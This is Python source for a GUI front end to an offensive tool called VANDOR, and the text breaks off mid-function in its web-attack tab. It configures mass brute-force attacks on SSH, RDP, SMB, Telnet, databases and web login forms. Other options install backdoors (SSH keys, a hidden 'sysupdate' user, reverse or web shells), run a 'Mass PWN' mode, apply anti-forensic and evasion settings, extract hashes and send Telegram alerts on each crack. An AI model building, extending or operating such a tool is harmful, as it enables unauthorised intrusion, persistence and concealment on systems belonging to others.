import subprocess
import time
import os
import threading
import psutil
import customtkinter as ctk
from tkinter import filedialog, messagebox
import shutil
import json
from datetime import datetime
import socket
import ipaddress
import re
from queue import Queue
import time

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

class VandorLauncher(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("VANDOR - Elite Penetration Framework | Full Control")
        self.geometry("1500x950")
        self.minsize(1300, 800)

        self.process = None
        self.scan_process = None
        self.alive_scan_stop = False
        self.port_scan_stop = False
        self.settings_file = "vandor_settings.json"
        self.load_settings()

        self.default_ports = {
            "ssh": 22, "rdp": 3389, "ftp": 21, "mysql": 3306,
            "smb": 445, "telnet": 23, "vnc": 5900, "postgres": 5432,
            "redis": 6379, "mongodb": 27017, "smb2": 445, "pop3": 110,
            "imap": 143, "smtp": 25, "snmp": 161, "ldap": 389, "http": 80,
            "https": 443, "ssh-alt": 2222, "rdp-alt": 3390
        }

        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)

        self.main_container = ctk.CTkFrame(self, fg_color="transparent")
        self.main_container.grid(row=0, column=0, sticky="nsew", padx=15, pady=15)
        self.main_container.grid_rowconfigure(1, weight=1)
        self.main_container.grid_columnconfigure(0, weight=1)

        self.header_frame = ctk.CTkFrame(self.main_container, height=80, corner_radius=15)
        self.header_frame.grid(row=0, column=0, sticky="ew", pady=(0, 15))
        self.header_frame.grid_propagate(False)

        self.title_label = ctk.CTkLabel(
            self.header_frame, 
            text="VANDOR GUI v2.0.5 - Victory Arrives Never Directly, Only Remotely", 
            font=ctk.CTkFont(size=28, weight="bold", family="Consolas"),
            text_color="#ff3e3e"
        )
        self.title_label.pack(pady=20)

        self.tabview = ctk.CTkTabview(self.main_container, width=1400, height=720, corner_radius=15)
        self.tabview.grid(row=1, column=0, sticky="nsew")

        self.tab_beginner = self.tabview.add("🎯 BEGINNER")
        self.tab_advanced = self.tabview.add("🔥 ADVANCED")
        self.tab_webinferno = self.tabview.add("🌋 WEB INFERNO")
        self.tab_archive = self.tabview.add("📦 ARCHIVE CRACKER")
        self.tab_alive = self.tabview.add("💚 ALIVE SCANNER")
        self.tab_install = self.tabview.add("📦 INSTALLER")
        self.tab_output = self.tabview.add("💀 CONSOLE")

        self.setup_beginner_tab()
        self.setup_advanced_tab()
        self.setup_webinferno_tab()
        self.setup_archive_cracker_tab()
        self.setup_alive_scanner_tab()
        self.setup_install_tab()
        self.setup_output_tab()

        self.status_frame = ctk.CTkFrame(self.main_container, height=40, corner_radius=10)
        self.status_frame.grid(row=2, column=0, sticky="ew", pady=(10, 0))
        
        self.status_label = ctk.CTkLabel(
            self.status_frame, 
            text="● SYSTEM READY", 
            font=ctk.CTkFont(size=12, weight="bold"),
            text_color="#00ff00"
        )
        self.status_label.pack(side="left", padx=15, pady=10)
        
        self.time_label = ctk.CTkLabel(
            self.status_frame, 
            text="", 
            font=ctk.CTkFont(size=12),
            text_color="#888888"
        )
        self.time_label.pack(side="right", padx=15, pady=10)
        
        self.update_time()
        self.check_vandor_installation()

    def load_settings(self):
        if os.path.exists(self.settings_file):
            try:
                with open(self.settings_file, 'r') as f:
                    self.settings = json.load(f)
            except:
                self.settings = {}
        else:
            self.settings = {}

    def save_settings(self):
        try:
            with open(self.settings_file, 'w') as f:
                json.dump(self.settings, f, indent=2)
        except:
            pass

    def update_time(self):
        self.time_label.configure(text=datetime.now().strftime("%H:%M:%S"))
        self.after(1000, self.update_time)

    def get_port_for_protocol(self, protocol, custom_port=None):
        if custom_port and str(custom_port).strip():
            return int(custom_port)
        return self.default_ports.get(protocol.lower(), 22)

    def setup_beginner_tab(self):
        main_frame = ctk.CTkScrollableFrame(self.tab_beginner, corner_radius=15)
        main_frame.pack(fill="both", expand=True, padx=20, pady=20)

        left_panel = ctk.CTkFrame(main_frame, corner_radius=12)
        left_panel.pack(side="left", fill="both", expand=True, padx=(0, 10), pady=10)

        right_panel = ctk.CTkFrame(main_frame, corner_radius=12)
        right_panel.pack(side="right", fill="both", expand=True, padx=(10, 0), pady=10)

        ctk.CTkLabel(left_panel, text="TARGET CONFIGURATION", font=ctk.CTkFont(size=18, weight="bold"), text_color="#ff6b6b").pack(pady=(15, 10))

        self.basic_hosts_frame = ctk.CTkFrame(left_panel, fg_color="transparent")
        self.basic_hosts_frame.pack(fill="x", padx=15, pady=8)
        ctk.CTkLabel(self.basic_hosts_frame, text="Hosts:", width=80, font=ctk.CTkFont(size=13)).pack(side="left")
        self.basic_hosts = ctk.CTkEntry(self.basic_hosts_frame, placeholder_text="IP, IP:port, CIDR, or file.txt", height=35)
        self.basic_hosts.pack(side="left", fill="x", expand=True, padx=(10, 0))
        ctk.CTkButton(self.basic_hosts_frame, text="📂", width=45, height=35, command=lambda: self.open_file_dialog(self.basic_hosts)).pack(side="right", padx=(5, 0))

        self.basic_user_frame = ctk.CTkFrame(left_panel, fg_color="transparent")
        self.basic_user_frame.pack(fill="x", padx=15, pady=8)
        ctk.CTkLabel(self.basic_user_frame, text="Users:", width=80, font=ctk.CTkFont(size=13)).pack(side="left")
        self.basic_user = ctk.CTkEntry(self.basic_user_frame, placeholder_text="username or users.txt", height=35)
        self.basic_user.pack(side="left", fill="x", expand=True, padx=(10, 0))
        ctk.CTkButton(self.basic_user_frame, text="📂", width=45, height=35, command=lambda: self.open_file_dialog(self.basic_user)).pack(side="right", padx=(5, 0))

        self.basic_pass_frame = ctk.CTkFrame(left_panel, fg_color="transparent")
        self.basic_pass_frame.pack(fill="x", padx=15, pady=8)
        ctk.CTkLabel(self.basic_pass_frame, text="Passwords:", width=80, font=ctk.CTkFont(size=13)).pack(side="left")
        self.basic_pass = ctk.CTkEntry(self.basic_pass_frame, placeholder_text="password or passwords.txt", height=35)
        self.basic_pass.pack(side="left", fill="x", expand=True, padx=(10, 0))
        ctk.CTkButton(self.basic_pass_frame, text="📂", width=45, height=35, command=lambda: self.open_file_dialog(self.basic_pass)).pack(side="right", padx=(5, 0))

        config_frame = ctk.CTkFrame(left_panel, fg_color="transparent")
        config_frame.pack(fill="x", padx=15, pady=15)

        ctk.CTkLabel(config_frame, text="Protocol:", font=ctk.CTkFont(size=13)).grid(row=0, column=0, padx=5, pady=8, sticky="w")
        self.basic_proto = ctk.CTkComboBox(config_frame, values=["ssh", "rdp", "ftp", "mysql", "smb", "telnet", "vnc", "postgres", "redis", "mongodb", "http", "https"], height=35)
        self.basic_proto.grid(row=0, column=1, padx=5, pady=8, sticky="ew")

        ctk.CTkLabel(config_frame, text="Port:", font=ctk.CTkFont(size=13)).grid(row=1, column=0, padx=5, pady=8, sticky="w")
        self.basic_port = ctk.CTkEntry(config_frame, placeholder_text="auto", height=35)
        self.basic_port.grid(row=1, column=1, padx=5, pady=8, sticky="ew")

        ctk.CTkLabel(config_frame, text="Timeout (sec):", font=ctk.CTkFont(size=13)).grid(row=2, column=0, padx=5, pady=8, sticky="w")
        self.basic_timeout = ctk.CTkEntry(config_frame, placeholder_text="5", height=35)
        self.basic_timeout.grid(row=2, column=1, padx=5, pady=8, sticky="ew")

        ctk.CTkLabel(config_frame, text="Threads:", font=ctk.CTkFont(size=13)).grid(row=3, column=0, padx=5, pady=8, sticky="w")
        self.basic_threads = ctk.CTkEntry(config_frame, placeholder_text="5000", height=35)
        self.basic_threads.grid(row=3, column=1, padx=5, pady=8, sticky="ew")

        config_frame.grid_columnconfigure(1, weight=1)

        ctk.CTkLabel(right_panel, text="QUICK PRESETS", font=ctk.CTkFont(size=18, weight="bold"), text_color="#ff6b6b").pack(pady=(15, 10))

        presets = [
            ("🌐 SSH Bruteforce", "ssh", "root", "rockyou.txt", "22"),
            ("🪟 RDP Attack", "rdp", "administrator", "passwords.txt", "3389"),
            ("🗄️ MySQL Crack", "mysql", "root", "mysql_pass.txt", "3306"),
            ("📁 SMB Share", "smb", "admin", "common.txt", "445"),
            ("🔌 Telnet IoT", "telnet", "root", "default.txt", "23"),
            ("🖥️ VNC Crack", "vnc", "", "vnc_pass.txt", "5900"),
        ]

        for name, proto, user, pwd, port in presets:
            btn = ctk.CTkButton(
                right_panel, 
                text=name, 
                command=lambda p=proto, u=user, pw=pwd, pt=port: self.load_preset(p, u, pw, pt),
                fg_color="#2d2d2d",
                hover_color="#3d3d3d",
                height=40,
                font=ctk.CTkFont(size=13)
            )
            btn.pack(fill="x", padx=15, pady=5)

        ctk.CTkLabel(right_panel, text="", height=20).pack()
        
        self.basic_advanced_btn = ctk.CTkButton(
            right_panel,
            text="⚡ SWITCH TO ADVANCED MODE ⚡",
            command=lambda: self.tabview.set("🔥 ADVANCED"),
            fg_color="#8b0000",
            hover_color="#ff0000",
            height=50,
            font=ctk.CTkFont(size=15, weight="bold")
        )
        self.basic_advanced_btn.pack(pady=20, padx=15, fill="x")

    def setup_advanced_tab(self):
        main_frame = ctk.CTkScrollableFrame(self.tab_advanced, corner_radius=15)
        main_frame.pack(fill="both", expand=True, padx=20, pady=20)

        left_frame = ctk.CTkFrame(main_frame, corner_radius=12)
        left_frame.pack(side="left", fill="both", expand=True, padx=(0, 10), pady=10)

        center_frame = ctk.CTkFrame(main_frame, corner_radius=12)
        center_frame.pack(side="left", fill="both", expand=True, padx=5, pady=10)

        right_frame = ctk.CTkScrollableFrame(main_frame, corner_radius=12, width=450)
        right_frame.pack(side="right", fill="both", expand=True, padx=(10, 0), pady=10)

        ctk.CTkLabel(left_frame, text="⚙️ TARGET SETTINGS", font=ctk.CTkFont(size=17, weight="bold"), text_color="#ff6b6b").pack(pady=10)

        self.adv_hosts_frame = ctk.CTkFrame(left_frame, fg_color="transparent")
        self.adv_hosts_frame.pack(fill="x", padx=15, pady=8)
        ctk.CTkLabel(self.adv_hosts_frame, text="Hosts:", width=70, font=ctk.CTkFont(size=13)).pack(side="left")
        self.adv_hosts = ctk.CTkEntry(self.adv_hosts_frame, placeholder_text="targets.txt or IP range", height=35)
        self.adv_hosts.pack(side="left", fill="x", expand=True, padx=(10, 0))
        ctk.CTkButton(self.adv_hosts_frame, text="📂", width=45, height=35, command=lambda: self.open_file_dialog(self.adv_hosts)).pack(side="right", padx=(5, 0))

        self.adv_user_frame = ctk.CTkFrame(left_frame, fg_color="transparent")
        self.adv_user_frame.pack(fill="x", padx=15, pady=8)
        ctk.CTkLabel(self.adv_user_frame, text="Users:", width=70, font=ctk.CTkFont(size=13)).pack(side="left")
        self.adv_user = ctk.CTkEntry(self.adv_user_frame, placeholder_text="users.txt", height=35)
        self.adv_user.pack(side="left", fill="x", expand=True, padx=(10, 0))
        ctk.CTkButton(self.adv_user_frame, text="📂", width=45, height=35, command=lambda: self.open_file_dialog(self.adv_user)).pack(side="right", padx=(5, 0))

        self.adv_pass_frame = ctk.CTkFrame(left_frame, fg_color="transparent")
        self.adv_pass_frame.pack(fill="x", padx=15, pady=8)
        ctk.CTkLabel(self.adv_pass_frame, text="Passwords:", width=70, font=ctk.CTkFont(size=13)).pack(side="left")
        self.adv_pass = ctk.CTkEntry(self.adv_pass_frame, placeholder_text="passwords.txt", height=35)
        self.adv_pass.pack(side="left", fill="x", expand=True, padx=(10, 0))
        ctk.CTkButton(self.adv_pass_frame, text="📂", width=45, height=35, command=lambda: self.open_file_dialog(self.adv_pass)).pack(side="right", padx=(5, 0))

        self.adv_creds_frame = ctk.CTkFrame(left_frame, fg_color="transparent")
        self.adv_creds_frame.pack(fill="x", padx=15, pady=8)
        ctk.CTkLabel(self.adv_creds_frame, text="Creds File:", width=70, font=ctk.CTkFont(size=13)).pack(side="left")
        self.adv_creds = ctk.CTkEntry(self.adv_creds_frame, placeholder_text="user:pass (optional)", height=35)
        self.adv_creds.pack(side="left", fill="x", expand=True, padx=(10, 0))
        ctk.CTkButton(self.adv_creds_frame, text="📂", width=45, height=35, command=lambda: self.open_file_dialog(self.adv_creds)).pack(side="right", padx=(5, 0))

        ctk.CTkLabel(center_frame, text="🎯 PROTOCOL & PORTS", font=ctk.CTkFont(size=17, weight="bold"), text_color="#ff6b6b").pack(pady=10)

        self.adv_proto = ctk.CTkComboBox(center_frame, values=["ssh", "rdp", "ftp", "mysql", "smb", "telnet", "vnc", "postgres", "redis", "mongodb", "smb2", "pop3", "imap", "smtp", "snmp", "ldap", "http", "https"], height=40)
        self.adv_proto.pack(padx=15, pady=8, fill="x")
        self.adv_proto.set("ssh")

        self.adv_port = ctk.CTkEntry(center_frame, placeholder_text="Custom Port (optional)", height=35)
        self.adv_port.pack(padx=15, pady=8, fill="x")

        self.adv_timeout = ctk.CTkEntry(center_frame, placeholder_text="Timeout (seconds)", height=35)
        self.adv_timeout.pack(padx=15, pady=8, fill="x")
        self.adv_timeout.insert(0, "5")

        self.adv_threads = ctk.CTkEntry(center_frame, placeholder_text="Threads", height=35)
        self.adv_threads.pack(padx=15, pady=8, fill="x")
        self.adv_threads.insert(0, "5000")

        ctk.CTkLabel(center_frame, text="🔧 ATTACK MODE", font=ctk.CTkFont(size=17, weight="bold"), text_color="#ff6b6b").pack(pady=(15, 5))
        
        self.attack_mode = ctk.CTkComboBox(center_frame, values=["normal", "null", "userpass", "reverse"], height=40)
        self.attack_mode.pack(padx=15, pady=8, fill="x")
        self.attack_mode.set("normal")

        ctk.CTkLabel(center_frame, text="🌍 ROUTING", font=ctk.CTkFont(size=17, weight="bold"), text_color="#ff6b6b").pack(pady=(15, 5))
        
        self.multi_city = ctk.CTkCheckBox(center_frame, text="Multi-City Routing (-multi-city)", font=ctk.CTkFont(size=13))
        self.multi_city.pack(pady=5, padx=15, anchor="w")

        ctk.CTkLabel(right_frame, text="💀 EXPLOIT MODULES", font=ctk.CTkFont(size=17, weight="bold"), text_color="#ff6b6b").pack(pady=10)

        self.check_smart = ctk.CTkCheckBox(right_frame, text="🧠 Smart Password Generation (-smart-pass)", font=ctk.CTkFont(size=13))
        self.check_smart.pack(pady=5, padx=15, anchor="w")
        
        self.check_gpu = ctk.CTkCheckBox(right_frame, text="🎮 GPU Acceleration (-gpu)", font=ctk.CTkFont(size=13))
        self.check_gpu.pack(pady=5, padx=15, anchor="w")
        
        self.check_ramdisk = ctk.CTkCheckBox(right_frame, text="💾 RAM Disk Mode (-ramdisk)", font=ctk.CTkFont(size=13))
        self.check_ramdisk.pack(pady=5, padx=15, anchor="w")
        
        self.check_post = ctk.CTkCheckBox(right_frame, text="🐚 Post-Exploitation (-post-exploit)", font=ctk.CTkFont(size=13))
        self.check_post.pack(pady=5, padx=15, anchor="w")
        
        self.check_backdoor = ctk.CTkCheckBox(right_frame, text="🚪 Install Backdoor (-backdoor)", font=ctk.CTkFont(size=13))
        self.check_backdoor.pack(pady=5, padx=15, anchor="w")
        
        self.backdoor_frame = ctk.CTkFrame(right_frame, fg_color="transparent")
        self.backdoor_frame.pack(fill="x", padx=15, pady=5)
        
        ctk.CTkLabel(self.backdoor_frame, text="Backdoor Type:", font=ctk.CTkFont(size=12)).pack(anchor="w")
        self.backdoor_type = ctk.CTkComboBox(self.backdoor_frame, values=["ssh-key", "hidden-user", "reverse-shell", "sshd-port", "web-shell", "all"], height=35)
        self.backdoor_type.pack(fill="x", pady=(5, 0))
        self.backdoor_type.set("ssh-key")
        
        ctk.CTkLabel(self.backdoor_frame, text="Backdoor Port:", font=ctk.CTkFont(size=12)).pack(anchor="w", pady=(10, 0))
        self.backdoor_port = ctk.CTkEntry(self.backdoor_frame, placeholder_text="22222", height=35)
        self.backdoor_port.pack(fill="x", pady=(5, 0))
        
        ctk.CTkLabel(self.backdoor_frame, text="Backdoor User:", font=ctk.CTkFont(size=12)).pack(anchor="w", pady=(10, 0))
        self.backdoor_user = ctk.CTkEntry(self.backdoor_frame, placeholder_text="sysupdate", height=35)
        self.backdoor_user.pack(fill="x", pady=(5, 0))
        
        ctk.CTkLabel(self.backdoor_frame, text="Backdoor Password:", font=ctk.CTkFont(size=12)).pack(anchor="w", pady=(10, 0))
        self.backdoor_pass = ctk.CTkEntry(self.backdoor_frame, placeholder_text="P@ssw0rd123!", height=35)
        self.backdoor_pass.pack(fill="x", pady=(5, 0))

        self.check_masspwn = ctk.CTkCheckBox(right_frame, text="💀 Mass PWN Mode (-mass-pwn)", font=ctk.CTkFont(size=13))
        self.check_masspwn.pack(pady=5, padx=15, anchor="w")
        
        self.check_honeypot = ctk.CTkCheckBox(right_frame, text="🍯 Honeypot Detection (-honeypot)", font=ctk.CTkFont(size=13))
        self.check_honeypot.pack(pady=5, padx=15, anchor="w")
        
        self.check_antiforensic = ctk.CTkCheckBox(right_frame, text="👻 Anti-Forensic (-anti-forensic)", font=ctk.CTkFont(size=13))
        self.check_antiforensic.pack(pady=5, padx=15, anchor="w")
        
        self.check_scan = ctk.CTkCheckBox(right_frame, text="🔍 Scan Network (-scan-network)", font=ctk.CTkFont(size=13))
        self.check_scan.pack(pady=5, padx=15, anchor="w")
        
        self.check_hash = ctk.CTkCheckBox(right_frame, text="💎 Extract Hashes (-extract-hash)", font=ctk.CTkFont(size=13))
        self.check_hash.pack(pady=5, padx=15, anchor="w")
        
        self.check_script = ctk.CTkCheckBox(right_frame, text="📜 Generate Login Script (-gen-script)", font=ctk.CTkFont(size=13))
        self.check_script.pack(pady=5, padx=15, anchor="w")
        
        self.check_resume = ctk.CTkCheckBox(right_frame, text="🔄 Resume from Checkpoint (-resume)", font=ctk.CTkFont(size=13))
        self.check_resume.pack(pady=5, padx=15, anchor="w")
        
        self.check_skip_alive = ctk.CTkCheckBox(right_frame, text="⏩ Skip Alive Check (-skip-alive)", font=ctk.CTkFont(size=13))
        self.check_skip_alive.pack(pady=5, padx=15, anchor="w")
        
        self.check_auto_port = ctk.CTkCheckBox(right_frame, text="🔄 Auto Detect Port (-auto-port)", font=ctk.CTkFont(size=13))
        self.check_auto_port.pack(pady=5, padx=15, anchor="w")

        self.http_frame = ctk.CTkFrame(right_frame, fg_color="transparent")
        self.http_frame.pack(fill="x", padx=15, pady=10)
        
        ctk.CTkLabel(self.http_frame, text="🌐 HTTP Form Attack", font=ctk.CTkFont(size=14, weight="bold"), text_color="#ffaa00").pack(anchor="w", pady=(10, 5))
        
        self.check_http = ctk.CTkCheckBox(self.http_frame, text="Enable HTTP Form Attack", font=ctk.CTkFont(size=12))
        self.check_http.pack(anchor="w", pady=5)
        
        self.http_path = ctk.CTkEntry(self.http_frame, placeholder_text="Login path (e.g., /login)", height=35)
        self.http_path.pack(fill="x", pady=5)
        
        self.http_user_field = ctk.CTkEntry(self.http_frame, placeholder_text="Username field", height=35)
        self.http_user_field.pack(fill="x", pady=5)
        self.http_user_field.insert(0, "username")
        
        self.http_pass_field = ctk.CTkEntry(self.http_frame, placeholder_text="Password field", height=35)
        self.http_pass_field.pack(fill="x", pady=5)
        self.http_pass_field.insert(0, "password")

        self.delay_frame = ctk.CTkFrame(right_frame, fg_color="transparent")
        self.delay_frame.pack(fill="x", padx=15, pady=10)
        
        ctk.CTkLabel(self.delay_frame, text="⏱️ Delay Settings", font=ctk.CTkFont(size=14, weight="bold"), text_color="#ffaa00").pack(anchor="w", pady=(10, 5))
        
        self.min_delay = ctk.CTkEntry(self.delay_frame, placeholder_text="Min Delay (ms)", height=35)
        self.min_delay.pack(fill="x", pady=5)
        
        self.max_delay = ctk.CTkEntry(self.delay_frame, placeholder_text="Max Delay (ms)", height=35)
        self.max_delay.pack(fill="x", pady=5)

        self.telegram_frame = ctk.CTkFrame(right_frame, fg_color="#1a1a1a", corner_radius=10)
        self.telegram_frame.pack(fill="x", padx=15, pady=10)
        
        ctk.CTkLabel(self.telegram_frame, text="📱 TELEGRAM NOTIFICATIONS", font=ctk.CTkFont(size=14, weight="bold"), text_color="#ffaa00").pack(anchor="w", pady=(10, 5), padx=10)
        
        self.check_notify = ctk.CTkCheckBox(self.telegram_frame, text="Enable Telegram Alerts", font=ctk.CTkFont(size=12))
        self.check_notify.pack(anchor="w", pady=5, padx=10)
        
        self.tg_token = ctk.CTkEntry(self.telegram_frame, placeholder_text="Bot Token", height=35)
        self.tg_token.pack(fill="x", pady=5, padx=10)
        
        self.tg_chat = ctk.CTkEntry(self.telegram_frame, placeholder_text="Chat ID", height=35)
        self.tg_chat.pack(fill="x", pady=5, padx=10)
        
        self.notify_level = ctk.CTkComboBox(self.telegram_frame, values=["0 - Off", "1 - On Crack", "2 - On Completion"], height=35)
        self.notify_level.pack(fill="x", pady=5, padx=10)
        self.notify_level.set("1 - On Crack")

        self.export_frame = ctk.CTkFrame(right_frame, fg_color="transparent")
        self.export_frame.pack(fill="x", padx=15, pady=10)
        
        ctk.CTkLabel(self.export_frame, text="📊 Export Options", font=ctk.CTkFont(size=14, weight="bold"), text_color="#ffaa00").pack(anchor="w", pady=(10, 5))
        
        self.check_json = ctk.CTkCheckBox(self.export_frame, text="Export JSON (-json)", font=ctk.CTkFont(size=12))
        self.check_json.pack(anchor="w", pady=5)
        self.check_json.select()
        
        self.check_csv = ctk.CTkCheckBox(self.export_frame, text="Export CSV (-csv)", font=ctk.CTkFont(size=12))
        self.check_csv.pack(anchor="w", pady=5)

        self.monitor_mode = ctk.CTkCheckBox(right_frame, text="📊 Monitor Mode (-monitor)", font=ctk.CTkFont(size=13))
        self.monitor_mode.pack(pady=5, padx=15, anchor="w")

    def setup_webinferno_tab(self):
        main_frame = ctk.CTkScrollableFrame(self.tab_webinferno, corner_radius=15)
        main_frame.pack(fill="both", expand=True, padx=20, pady=20)

        left_frame = ctk.CTkFrame(main_frame, corner_radius=12)
        left_frame.pack(side="left", fill="both", expand=True, padx=(0, 10), pady=10)

        right_frame = ctk.CTkScrollableFrame(main_frame, corner_radius=12, width=500)
        right_frame.pack(side="right", fill="both", expand=True, padx=(10, 0), pady=10)

        ctk.CTkLabel(left_frame, text="🌋 WEB INFERNO - HTTP ATTACK ENGINE", font=ctk.CTkFont(size=18, weight="bold"), text_color="#ff6b6b").pack(pady=10)

        self.req_frame = ctk.CTkFrame(left_frame, fg_color="transparent")
        self.req_frame.pack(fill="x", padx=15, pady=8)
        ctk.CTkLabel(self.req_frame, text="Request File / URL:", width=120, font=ctk.CTkFont(size=13)).pack(side="left")
        self.req_file = ctk.CTkEntry(self.req_frame, placeholder_text="burp_request.txt or http://example.com/api", height=35)
        self.req_file.pack(side="left", fill="x", expand=True, padx=(10, 0))
        ctk.CTkButton(self.req_frame, text="📂", width=45, height=35, command=lambda: self.open_file_dialog(self.req_file)).pack(side="right", padx=(5, 0))

        self.web_method_frame = ctk.CTkFrame(left_frame, fg_color="transparent")
        self.web_method_frame.pack(fill="x", padx=15, pady=8)
        ctk.CTkLabel(self.web_method_frame, text="Method:", width=120, font=ctk.CTkFont(size=13)).pack(side="left")
        self.web_method = ctk.CTkComboBox(self.web_method_frame, values=["GET", "POST", "PUT", "DELETE", "PATCH"], height=35)
        self.web_method.pack(side="left", padx=(10, 0), fill="x", expand=True)
        self.web_method.set("GET")

        self.web_body_frame = ctk.CTkFrame(left_frame, fg_color="transparent")
        self.web_body_frame.pack(fill="x", padx=15, pady=8)
        ctk.CTkLabel(self.web_body_frame, text="Request Body:", width=120, font=ctk.CTkFont(size=13)).pack(side="left", anchor="n")
        self.web_body = ctk.CTkTextbox(self.web_body_frame, height=100, font=ctk.CTkFont(size=11))
        self.web_body.pack(side="left", fill="x", expand=True, padx=(10, 0))

        self.web_headers_frame = ctk.CTkFrame(left_frame, fg_color="transparent")
        self.web_headers_frame.pack(fill="x", padx=15, pady=8)
        ctk.CTkLabel(self.web_headers_frame, text="Custom Headers:", width=120, font=ctk.CTkFont(size=13)).pack(side="left")
        self.web_headers = ctk.CTkEntry(self.web_headers_frame, placeholder_text="Header1: value1, Header2: value2", height=35)
        self.web_headers.pack(side="left", fill="x", expand=True, padx=(10, 0))

        self.web_vars_frame = ctk.CTkFrame(left_frame, fg_color="transparent")
        self.web_vars_frame.pack(fill="x", padx=15, pady=8)
        ctk.CTkLabel(self.web_vars_frame, text="Variables:", width=120, font=ctk.CTkFont(size=13)).pack(side="left")
        self.web_vars = ctk.CTkEntry(self.web_vars_frame, placeholder_text="user=users.txt,pass=passwords.txt", height=35)
        self.web_vars.pack(side="left", fill="x", expand=True, padx=(10, 0))
        ctk.CTkButton(self.web_vars_frame, text="📂", width=45, height=35, command=lambda: self.open_file_dialog(self.web_vars)).pack(side="right", padx=(5, 0))

        condition_frame = ctk.CTkFrame(left_frame, corner_radius=10, fg_color="#1a1a1a")
        condition_frame.pack(fill="x", padx=15, pady=10)

        ctk.CTkLabel(condition_frame, text="🎯 SUCCESS / FAILURE CONDITIONS", font=ctk.CTkFont(size=14, weight="bold"), text_color="#ffaa00").pack(pady=5)

        self.web_ifin_frame = ctk.CTkFrame(condition_frame, fg_color="transparent")
        self.web_ifin_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkLabel(self.web_ifin_frame, text="Save if contains:", width=120, font=ctk.CTkFont(size=12)).pack(side="left")
        self.web_ifin = ctk.CTkEntry(self.web_ifin_frame, placeholder_text="login successful", height=30)
        self.web_ifin.pack(side="left", fill="x", expand=True, padx=(10, 0))

        self.web_ifnin_frame = ctk.CTkFrame(condition_frame, fg_color="transparent")
        self.web_ifnin_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkLabel(self.web_ifnin_frame, text="Save if NOT contains:", width=120, font=ctk.CTkFont(size=12)).pack(side="left")
        self.web_ifnin = ctk.CTkEntry(self.web_ifnin_frame, placeholder_text="invalid password", height=30)
        self.web_ifnin.pack(side="left", fill="x", expand=True, padx=(10, 0))

        token_frame = ctk.CTkFrame(left_frame, corner_radius=10, fg_color="#1a1a1a")
        token_frame.pack(fill="x", padx=15, pady=10)

        ctk.CTkLabel(token_frame, text="🔑 TOKEN EXTRACTION", font=ctk.CTkFont(size=14, weight="bold"), text_color="#ffaa00").pack(pady=5)

        self.check_auto_token = ctk.CTkCheckBox(token_frame, text="Auto-detect CSRF tokens (-auto-token)", font=ctk.CTkFont(size=12))
        self.check_auto_token.pack(anchor="w", padx=10, pady=2)
        self.check_auto_token.select()

        self.web_token_regex = ctk.CTkEntry(token_frame, placeholder_text="Token Regex (-token-regex)", height=30)
        self.web_token_regex.pack(fill="x", padx=10, pady=5)

        self.check_dynamic_token = ctk.CTkCheckBox(token_frame, text="Dynamic Token Extraction (-dynamic-token)", font=ctk.CTkFont(size=12))
        self.check_dynamic_token.pack(anchor="w", padx=10, pady=2)

        self.token_url = ctk.CTkEntry(token_frame, placeholder_text="Token URL (-token-url)", height=30)
        self.token_url.pack(fill="x", padx=10, pady=2)

        self.token_method = ctk.CTkComboBox(token_frame, values=["GET", "POST"], height=30)
        self.token_method.pack(fill="x", padx=10, pady=2)
        self.token_method.set("GET")

        self.token_start = ctk.CTkEntry(token_frame, placeholder_text="Token Start String (-token-start)", height=30)
        self.token_start.pack(fill="x", padx=10, pady=2)

        self.token_end = ctk.CTkEntry(token_frame, placeholder_text="Token End String (-token-end)", height=30)
        self.token_end.pack(fill="x", padx=10, pady=2)

        self.token_refresh = ctk.CTkEntry(token_frame, placeholder_text="Refresh every N requests (-token-refresh)", height=30)
        self.token_refresh.pack(fill="x", padx=10, pady=2)
        self.token_refresh.insert(0, "1")

        self.token_field = ctk.CTkEntry(token_frame, placeholder_text="Token Field Name (-token-field)", height=30)
        self.token_field.pack(fill="x", padx=10, pady=2)
        self.token_field.insert(0, "token")

        ctk.CTkLabel(right_frame, text="⚙️ WEB INFERNO SETTINGS", font=ctk.CTkFont(size=16, weight="bold"), text_color="#ff6b6b").pack(pady=10)

        self.web_intel = ctk.CTkOptionMenu(right_frame, values=["0 - Dumb", "1 - Smart", "2 - Genius", "3 - God"], height=35)
        self.web_intel.pack(fill="x", padx=15, pady=5)
        self.web_intel.set("2 - Genius")

        self.web_evasion = ctk.CTkOptionMenu(right_frame, values=["0 - None", "1 - Basic", "2 - Moderate", "3 - Advanced", "4 - Paranoid", "5 - Insane"], height=35)
        self.web_evasion.pack(fill="x", padx=15, pady=5)
        self.web_evasion.set("3 - Advanced")

        self.web_threads = ctk.CTkEntry(right_frame, placeholder_text="Threads (-web-threads)", height=35)
        self.web_threads.pack(fill="x", padx=15, pady=5)
        self.web_threads.insert(0, "30")

        self.web_timeout = ctk.CTkEntry(right_frame, placeholder_text="Timeout (sec) (-web-timeout)", height=35)
        self.web_timeout.pack(fill="x", padx=15, pady=5)
        self.web_timeout.insert(0, "10")

        self.web_rate = ctk.CTkEntry(right_frame, placeholder_text="Rate Limit (-web-rate)", height=35)
        self.web_rate.pack(fill="x", padx=15, pady=5)
        self.web_rate.insert(0, "100")

        self.web_retries = ctk.CTkEntry(right_frame, placeholder_text="Max Retries (-web-retries)", height=35)
        self.web_retries.pack(fill="x", padx=15, pady=5)
        self.web_retries.insert(0, "2")

        self.check_web_learn = ctk.CTkCheckBox(right_frame, text="Learn from Responses (-web-learn)", font=ctk.CTkFont(size=12))
        self.check_web_learn.pack(anchor="w", padx=15, pady=3)
        self.check_web_learn.select()

        self.check_web_follow = ctk.CTkCheckBox(right_frame, text="Follow Redirects (-web-follow)", font=ctk.CTkFont(size=12))
        self.check_web_follow.pack(anchor="w", padx=15, pady=3)
        self.check_web_follow.select()

        self.check_web_random_delay = ctk.CTkCheckBox(right_frame, text="Random Delay 1-30s (-web-random-delay)", font=ctk.CTkFont(size=12))
        self.check_web_random_delay.pack(anchor="w", padx=15, pady=3)

        output_frame = ctk.CTkFrame(right_frame, corner_radius=10, fg_color="#1a1a1a")
        output_frame.pack(fill="x", padx=15, pady=10)

        ctk.CTkLabel(output_frame, text="📁 OUTPUT FILES", font=ctk.CTkFont(size=13, weight="bold"), text_color="#ffaa00").pack(pady=5)

        self.web_out = ctk.CTkEntry(output_frame, placeholder_text="Success output (-web-out)", height=30)
        self.web_out.pack(fill="x", padx=10, pady=3)
